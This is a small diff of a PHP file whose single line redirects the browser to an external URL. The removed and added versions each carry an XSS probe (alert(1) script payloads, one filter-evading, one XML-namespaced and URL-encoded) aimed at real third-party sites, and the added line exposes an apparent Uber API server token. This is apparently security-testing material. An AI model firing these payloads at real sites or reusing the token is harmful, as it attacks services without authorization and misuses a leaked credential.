@@ -1,3 +1,3 @@
 <?php
-header('location: https://editor.luminate.com/stripe_dynamic_css?style_id=style-7043347e-krmbvhve&viewer=xprs&parent_style=<script/旡alert(1)<\/script/旡');
+header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=%3C?xml%20version=%271.0%27?%3E%3Cx:script%20xmlns:x=%27http://www.w3.org/1999/xhtml%27%3Ealert(1%26%23x29%3b%3C/x:script%3E');
 ?>
